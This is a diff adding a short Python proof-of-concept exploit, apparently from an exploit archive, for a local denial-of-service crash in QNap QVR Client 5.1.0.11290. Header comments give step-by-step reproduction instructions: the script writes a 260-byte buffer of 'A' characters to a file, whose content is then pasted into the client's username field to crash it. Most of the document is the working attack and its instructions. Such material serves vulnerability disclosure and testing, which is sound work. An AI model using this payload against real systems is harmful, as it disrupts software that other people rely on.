@@ -1,0 +1,25 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# Exploit Title	: QNap QVR Client 5.1.0.11290 Crash PoC
+# Discovery by	: Luis Martínez
+# Email		: l4m5@hotmail.com
+# Discovery Date	: 05/11/2015
+# Vendor Homepage: http://www.qnapsecurity.com/n/en/
+# Software Link	: http://download.qnap.com/Surveillance/Utility/QMon_20150630.zip
+# Tested Version	: 5.1
+# Vulnerability Type	: Denial of Service (DoS) Local
+# Tested on OS	: Windows 10 Pro x64 es
+# Steps to Produce the Crash: 
+# 1.- Run python code : python qvr_client_5.1.py
+# 2.- Open qvr_client_5.1.txt and copy content to clipboard
+# 3.- Open QVR Client
+# 4.- Direccion IP/Puerto -> 10.10.10.1 / 80
+# 5.- Paste ClipBoard on "Nombre de Usuario"
+# 6.- Contraseña -> test
+# 7.- Aceptar
+# 8.- Crashed
+
+buffer = "\x41" * 260
+f = open ("qvr_client_5.1.txt", "w")
+f.write(buffer)
+f.close()
